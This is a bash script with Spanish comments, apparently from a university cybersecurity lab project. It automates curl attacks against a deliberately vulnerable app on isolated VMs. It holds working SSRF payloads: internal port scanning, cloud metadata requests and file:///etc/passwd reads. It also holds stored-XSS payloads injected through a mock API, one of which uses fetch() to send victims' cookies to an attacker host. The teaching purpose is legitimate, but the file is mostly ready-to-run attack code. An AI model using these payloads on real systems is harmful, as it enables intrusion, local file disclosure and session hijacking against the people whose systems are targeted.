#!/usr/bin/env bash
# =============================================================================
# payloads.sh - Automatiza los payloads de docs/payloads.txt como comandos curl.
# Proyecto de Ciberseguridad UCAB 2026 - rama version-vulnerable.
#
# USO EXCLUSIVO en el entorno controlado y aislado (VMs Kali + Ubuntu Server).
#
# La explicacion de cada payload esta en docs/payloads.txt y en los guiones
# docs/demo_ssrf.md / docs/demo_xss_api.md. Este script SOLO automatiza los
# comandos; no repite las explicaciones.
#
# Uso:
#   ./payloads.sh [IP_VICTIMA]           # IP por argumento
#   VICTIMA=192.168.56.100 ./payloads.sh # IP por variable de entorno
#   ATACANTE=192.168.56.101 ./payloads.sh <IP_VICTIMA>   # para el robo de cookies
#
# Variables:
#   VICTIMA  - IP de la VM victima (default 192.168.56.100). El argumento 1 gana.
#   ATACANTE - IP de la VM Kali para el listener de robo de cookies (payload 2.3).
# =============================================================================

set -u

# IP de la victima: 1) primer argumento, 2) variable de entorno VICTIMA, 3) default.
VICTIMA="${1:-${VICTIMA:-192.168.56.100}}"
# IP del atacante (Kali) para la exfiltracion de cookies del payload 2.3.
ATACANTE="${ATACANTE:-192.168.56.101}"

APP="http://${VICTIMA}:8080"      # App PHP (frontend + backend)
API="http://${VICTIMA}:5000"      # API mock (Python)

# Helper: imprime un separador con titulo antes de cada payload.
titulo() { echo; echo "=== $* ==="; }

# Helper: pasa la salida por json.tool si esta disponible (mas legible).
pretty() { if command -v python3 >/dev/null 2>&1; then python3 -m json.tool 2>/dev/null || cat; else cat; fi; }

echo "############################################################"
echo "# Objetivo VICTIMA = ${VICTIMA}  (app :8080 / api :5000)"
echo "# ATACANTE (listener cookies) = ${ATACANTE}"
echo "############################################################"

# =============================================================================
# SECCION 1: SSRF (API7:2023 / CWE-918)
# Vector: campo url_repositorio en POST /backend/crear_perfil.php
# Ref: docs/payloads.txt seccion 1 - docs/demo_ssrf.md
# =============================================================================

# --- 1.1 Peticion legitima (baseline) ---
titulo "1.1 SSRF baseline (URL legitima)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Juan" \
  -F "apellido=Perez" \
  -F "bio=Desarrollador backend" \
  -F "url_repositorio=https://github.com/usuario/proyecto-ejemplo" | pretty

# --- 1.2 Acceso a servicio interno via localhost ---
titulo "1.2 SSRF a servicio interno (localhost:5000/repos)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Atacante" \
  -F "url_repositorio=http://localhost:5000/repos" | pretty

# --- 1.3 Acceso a servicio interno via 127.0.0.1 (bypass de filtro "localhost") ---
titulo "1.3 SSRF a servicio interno (127.0.0.1:5000/repos)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Atacante" \
  -F "url_repositorio=http://127.0.0.1:5000/repos" | pretty

# --- 1.4 Escaneo de puertos internos: SSH (22) ---
titulo "1.4 SSRF escaneo puerto 22 (SSH)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Scan" \
  -F "url_repositorio=http://127.0.0.1:22" | pretty

# --- 1.5 Escaneo de puertos internos: Redis (6379) ---
titulo "1.5 SSRF escaneo puerto 6379 (Redis)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Scan" \
  -F "url_repositorio=http://127.0.0.1:6379" | pretty

# --- 1.6 Escaneo de red interna (otra VM en la red host-only) ---
titulo "1.6 SSRF escaneo de red interna (${ATACANTE}:80)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Scan" \
  -F "url_repositorio=http://${ATACANTE}:80" | pretty

# --- 1.7 Metadatos de instancia cloud (solo funcional en AWS/GCP/Azure) ---
titulo "1.7 SSRF metadatos cloud (169.254.169.254)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Cloud" \
  -F "url_repositorio=http://169.254.169.254/latest/meta-data/" | pretty

# --- 1.8 Lectura de archivos locales via file:// ---
titulo "1.8 SSRF lectura de archivo local (file:///etc/passwd)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Exfil" \
  -F "url_repositorio=file:///etc/passwd" | pretty

# --- 1.9 Lectura del archivo de datos de la app ---
# Ajustar la ruta absoluta real del proyecto en la VM victima.
titulo "1.9 SSRF lectura de data/usuarios.txt (ajustar ruta)"
curl -s -X POST "${APP}/backend/crear_perfil.php" \
  -F "nombre=Exfil" \
  -F "url_repositorio=file:///ruta/absoluta/al/proyecto/data/usuarios.txt" | pretty

# =============================================================================
# SECCION 2: Consumo No Seguro de APIs + XSS (API10:2023 / CWE-20, CWE-79)
# Vector: POST /update_repos en api_mock.py (API de terceros comprometida)
# Ref: docs/payloads.txt seccion 2 - docs/demo_xss_api.md
# =============================================================================

# --- 2.1 XSS con <script> (PROPAGACION, no ejecucion via innerHTML) ---
titulo "2.1 Comprometer API - payload <script> (propagacion)"
curl -s -X POST "${API}/update_repos" \
  -H "Content-Type: application/json" \
  -d '[{"nombre":"repo-malicioso","descripcion":"<script>alert('"'"'XSS'"'"')</script>","url":"https://evil.com","lenguaje":"JavaScript"}]' | pretty

# --- 2.2 XSS con event handler <img onerror> (SI se ejecuta - payload de la demo) ---
titulo "2.2 Comprometer API - payload <img onerror> (ejecucion)"
curl -s -X POST "${API}/update_repos" \
  -H "Content-Type: application/json" \
  -d '[{"nombre":"repo-img","descripcion":"<img src=x onerror=alert(document.domain)>","url":"https://evil.com","lenguaje":"HTML"}]' | pretty

# --- 2.3 XSS con robo de cookies (exfiltra document.cookie al ATACANTE) ---
# Requiere un listener en Kali:  python3 -m http.server 8000
titulo "2.3 Comprometer API - robo de cookies hacia ${ATACANTE}:8000"
curl -s -X POST "${API}/update_repos" \
  -H "Content-Type: application/json" \
  -d '[{"nombre":"repo-cookie","descripcion":"<img src=x onerror=\"fetch('"'"'http://'"${ATACANTE}"':8000/?c='"'"'+document.cookie)\">","url":"https://evil.com","lenguaje":"JavaScript"}]' | pretty

# --- 2.4 Inyeccion de HTML malicioso en multiples campos ---
titulo "2.4 Comprometer API - inyeccion en multiples campos"
curl -s -X POST "${API}/update_repos" \
  -H "Content-Type: application/json" \
  -d '[{"nombre":"<b style=\"color:red\">HACKED</b>","descripcion":"<iframe src=\"javascript:alert(1)\"></iframe>","url":"javascript:alert(1)","lenguaje":"<script>alert(1)</script>"}]' | pretty

# --- Verificacion: el backend propaga el payload sin sanitizar ---
titulo "Verificacion: ver_portafolio.php propaga el payload"
curl -s "${APP}/backend/ver_portafolio.php" | pretty

echo
echo "Listo. Para ver el XSS ejecutarse, abrir ${APP}/ en el navegador de Kali"
echo "y pulsar 'Cargar Portafolio' (ver docs/demo_xss_api.md Paso 4)."
echo "Para restaurar el estado limpio, reiniciar api_mock.py (ver docs/despliegue_vms.md §7)."
